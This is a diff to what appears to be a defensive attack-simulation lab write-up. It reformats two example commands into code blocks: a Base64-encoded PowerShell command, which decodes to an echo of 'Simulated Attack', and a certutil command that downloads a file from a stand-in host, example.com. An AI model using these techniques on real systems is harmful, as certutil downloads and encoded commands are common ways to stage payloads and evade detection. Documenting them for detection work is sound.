@@ -28,8 +28,9 @@ This mimics how attackers often hide malicious commands using Base64 encoding.
 
 Example command executed:
 
-'powershell.exe -EncodedCommand ZQBjAGgAbwAgACIAUwBpAG0AdQBsAGEAdABlAGQAIABBAHQAdABhAGMAawAiAA=='
-
+```
+powershell.exe -EncodedCommand ZQBjAGgAbwAgACIAUwBpAG0AdQBsAGEAdABlAGQAIABBAHQAdABhAGMAawAiAA==
+```
 
 This technique maps to the MITRE ATT&CK technique:
 
@@ -157,8 +158,9 @@ In this simulation, a command using `certutil` was executed to simulate an attac
 
 The following command was executed in **Command Prompt** to simulate malicious activity using a built-in Windows binary:
 
-'certutil -urlcache -split -f http://example.com payload.txt'
-
+```
+certutil -urlcache -split -f http://example.com payload.txt
+```
 
 This command attempts to download a file from a remote location and store it locally.
 
